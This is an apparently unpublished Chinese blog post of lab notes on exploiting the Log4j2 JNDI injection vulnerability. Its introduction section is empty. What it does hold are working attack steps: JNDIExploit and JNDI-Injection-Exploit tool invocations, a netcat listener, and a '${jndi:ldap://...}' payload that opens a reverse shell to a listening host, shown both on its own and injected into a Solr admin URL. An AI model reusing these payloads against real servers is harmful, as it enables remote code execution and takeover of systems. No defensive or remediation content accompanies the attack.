---
layout: post
title: log4j2漏洞
subtitle: log4j2漏洞
date: 2024-09-18 09:42
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags: 
number headings: 
published: false
---
## 漏洞介绍


## JNDIExploit使用

[0x727/JNDIExploit: 一款用于JNDI注入利用的工具](https://github.com/0x727/JNDIExploit)

参考：[JNDIExploit使用 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/337333.html)

```
Usage: java -jar JNDIExploit.jar [options]
Options:
* -i, --ip Local ip address
-l, --ldapPort Ldap bind port (default: 1389)
-p, --httpPort Http bind port (default: 8080)
-u, --usage Show usage (default: false)
-h, --help Show this help
```

```shell
java -jar JNDIExploit-1.2-SNAPSHOT.jar -l 8888 -p 6666 -i 192.168.242.4
```

开启监听

```shell
nc -lvvp 10010
```

```shell
## poc
${jndi:ldap://192.168.242.4:8888/Basic/ReverseShell/192.168.242.4/10010}

http://your-ip/solr/admin/cores?action=${jndi:ldap://192.168.242.4:8888/Basic/ReverseShell/192.168.242.4/10010}
```

## JNDI-Injection-Exploit 使用

[sayers522/JNDI-Injection-Exploit: JNDI命令注入利用](https://github.com/sayers522/JNDI-Injection-Exploit)

编译
```shell
mvn clean package -DskipTests
```

命令：

```shell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /System/Applications/Calendar.app" -A 127.0.0.1
```